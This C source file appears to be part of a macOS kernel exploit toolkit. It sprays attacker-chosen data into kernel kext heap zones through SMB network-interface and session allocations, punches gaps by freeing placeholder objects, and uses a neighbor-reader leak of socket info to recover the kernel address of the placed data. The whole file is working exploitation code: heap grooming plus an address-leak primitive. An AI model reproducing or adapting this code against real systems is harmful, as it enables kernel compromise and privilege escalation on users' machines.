//
//  zalloc_kext_small.c
//  kmem_xepg
//
//  Created by admin on 12/27/21.
//

#include <assert.h>
#include <stdlib.h>
#include <string.h>

#include <dispatch/dispatch.h>
#include <sys/proc_info.h>
#include <sys/errno.h>

#include "../smb/nic_allocator.h"
#include "../smb/ssn_allocator.h"

#include "zkext_alloc_small.h"
#include "zkext_neighbor_reader.h"
#include "allocator_rw.h"
#include "util_misc.h"
#include "util_log.h"
#include "platform_constants.h"


#define NUM_PAD_ELEMENTS (XE_PAGE_SIZE / 32)
#define NUM_GAP_ELEMENTS (XE_PAGE_SIZE / 32 * 2)
#define NUM_SIZE_ELEMENTS (NUM_GAP_ELEMENTS * 2)

#define MAX_SESSIONS 5
#define MAX_TRIES 5


const int zone_kext_sizes[] = {
    16, 32, 48, 64, 80, 96, 128, 160, 192, 224, 256
};


int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, char* data, size_t data_size, struct kmem_zkext_alloc_small_entry* out) {
    size_t alloc_size = data_size + 8;
    assert(alloc_size < 256);
    
    int zone_size = -1;
    for (int i = 0; i < XE_ARRAY_SIZE(zone_kext_sizes); i++) {
        if (zone_kext_sizes[i] >= alloc_size) {
            zone_size = zone_kext_sizes[i];
            break;
        }
    }
    assert(zone_size > 0);
    
    kmem_zkext_neighour_reader_t reader = kmem_neighbor_reader_create();
    
    smb_nic_allocator offset_allocator = smb_nic_allocator_create(smb_addr, sizeof(*smb_addr));
    smb_nic_allocator pad_allocator = smb_nic_allocator_create(smb_addr, sizeof(*smb_addr));
    smb_nic_allocator gap_allocator = smb_nic_allocator_create(smb_addr, sizeof(*smb_addr));
    smb_nic_allocator size_placeholder_allocator = smb_nic_allocator_create(smb_addr, sizeof(*smb_addr));
    smb_nic_allocator element_allocator = smb_nic_allocator_create(smb_addr, sizeof(*smb_addr));
    smb_ssn_allocator* size_allocators = alloca(sizeof(smb_ssn_allocator) * NUM_SIZE_ELEMENTS / 4);
    dispatch_apply(NUM_SIZE_ELEMENTS / 4, DISPATCH_APPLY_AUTO, ^(size_t index) {
        size_allocators[index] = smb_ssn_allocator_create(smb_addr, sizeof(*smb_addr));
    });
    
    for (int gap_idx = 0; gap_idx < NUM_GAP_ELEMENTS; gap_idx++) {
        int num_offsets = random() % 2;
        struct network_nic_info offset_infos[num_offsets];
        bzero(offset_infos, sizeof(offset_infos));
        for (int offset_idx = 0; offset_idx < num_offsets; offset_idx++) {
            struct network_nic_info* info = &offset_infos[offset_idx];
            info->addr_4.sin_family = AF_INET;
            info->addr_4.sin_addr.s_addr = gap_idx * 4 + offset_idx;
            info->addr_4.sin_len = sizeof(struct sockaddr_in);
            info->next_offset = sizeof(struct network_nic_info);
        }
        
        struct network_nic_info* element_info = alloca(sizeof(struct network_nic_info) + 128);
        bzero(element_info, sizeof(struct network_nic_info) + 128);
        element_info->nic_index = 0;
        element_info->addr_4.sin_family = AF_INET;
        element_info->addr_4.sin_len = data_size + 8;
        element_info->addr_4.sin_addr.s_addr = gap_idx;
        memcpy(((char*)&element_info->addr_4) + 8, data, data_size);
        
        struct network_nic_info size_placeholder_info;
        bzero(&size_placeholder_info, sizeof(size_placeholder_info));
        size_placeholder_info.nic_index = 0;
        size_placeholder_info.addr_4.sin_family = AF_INET;
        size_placeholder_info.addr_4.sin_len = 32;
        size_placeholder_info.addr_4.sin_addr.s_addr = gap_idx;
        
        struct network_nic_info gap_info;
        bzero(&gap_info, sizeof(gap_info));
        gap_info.nic_index = 0;
        gap_info.addr_4.sin_family = AF_INET;
        gap_info.addr_4.sin_len = sizeof(struct sockaddr_in);
        gap_info.addr_4.sin_addr.s_addr = gap_idx;
        
        int error = num_offsets > 0 ? smb_nic_allocator_allocate(offset_allocator, offset_infos, num_offsets, (uint32_t)sizeof(offset_infos)) : 0;
        assert(error == 0);
        error = smb_nic_allocator_allocate(element_allocator, element_info, 1, sizeof(struct network_nic_info) + 128);
        assert(error == 0);
        error = smb_nic_allocator_allocate(size_placeholder_allocator, &size_placeholder_info, 1, sizeof(size_placeholder_info));
        assert(error == 0);
        error = smb_nic_allocator_allocate(gap_allocator, &gap_info, 1, sizeof(gap_info));
        assert(error == 0);
    }
    
    int error = smb_nic_allocator_destroy(&size_placeholder_allocator);
    assert(error == 0);
    
    char* size_data = alloca(32);
    *size_data = 0xff;
    size_data[31] = 0;
    
    dispatch_apply(NUM_SIZE_ELEMENTS / 4, DISPATCH_APPLY_AUTO, ^(size_t index) {
        char* domain_name = "d";
        int error = smb_ssn_allocator_allocate_adv(size_allocators[index], size_data, 32, size_data, 32, size_data, size_data, domain_name);
        assert(error == 0);
    });
    
    error = smb_nic_allocator_destroy(&gap_allocator);
    assert(error == 0);
    
    uint32_t pad_infos_size = sizeof(struct network_nic_info) * NUM_PAD_ELEMENTS / 2;
    struct network_nic_info* pad_infos = malloc(pad_infos_size);
    bzero(pad_infos, pad_infos_size);
    for (int i = 0; i < NUM_PAD_ELEMENTS / 2; i++) {
        struct network_nic_info* info = &pad_infos[i];
        info->nic_index = 0;
        info->addr_4.sin_family = AF_INET;
        info->addr_4.sin_len = 32;
        info->addr_4.sin_addr.s_addr = i;
    }
    error = smb_nic_allocator_allocate(pad_allocator, pad_infos, NUM_PAD_ELEMENTS / 2, pad_infos_size);
    assert(error == 0);
    free(pad_infos);
    
    char data_reader[32];
    data_reader[0] = 0x80;
        
    for (int try = 0; try < MAX_TRIES; try++) {
//        XE_LOG_INFO("try %d / %d", try, MAX_TRIES);
        kmem_zkext_neighbor_reader_prepare(reader, data_reader, sizeof(data_reader));
        struct socket_fdinfo modified[8];
        size_t num_modified = XE_ARRAY_SIZE(modified);
        kmem_zkext_neighbor_reader_read_modified(reader, modified, &num_modified);
        
        for (int i = 0; i < num_modified; i++) {
            uintptr_t* addr = (uintptr_t*)&modified[i].psi.soi_proto.pri_un.unsi_addr.ua_sun;
            for (int j = 0; j < 32; j += 4) {
                // may need to be improved for smaller alloc size
                if (addr[j] != 0 && addr[j] % zone_size == 0) {
                    out->address = addr[j];
                    error = 0;
                    goto done;
                }
            }
        }
        
        kmem_zkext_neighbor_reader_reset(reader);
    }
    
    error = EAGAIN;
done:
    kmem_zkext_neighbor_reader_destroy(&reader);
    smb_nic_allocator_destroy(&pad_allocator);
    dispatch_apply(NUM_SIZE_ELEMENTS / 4, DISPATCH_APPLY_AUTO, ^(size_t index) {
        smb_ssn_allocator_destroy(&size_allocators[index]);
    });
    smb_nic_allocator_destroy(&offset_allocator);
    
    return error;
}


struct kmem_zkext_alloc_small_entry kmem_zalloc_kext_small(const struct sockaddr_in* smb_addr, char* data, size_t data_size) {
    for (int i = 0; i < MAX_SESSIONS; i++) {
        XE_LOG_INFO("alloc session %d / %d", i, MAX_SESSIONS);
        struct kmem_zkext_alloc_small_entry entry;
        int error = kmem_zkext_alloc_small_try(smb_addr, data, data_size, &entry);
        if (!error) {
            return entry;
        }
    }
    printf("[ERROR] alloc failed\n");
    abort();
}
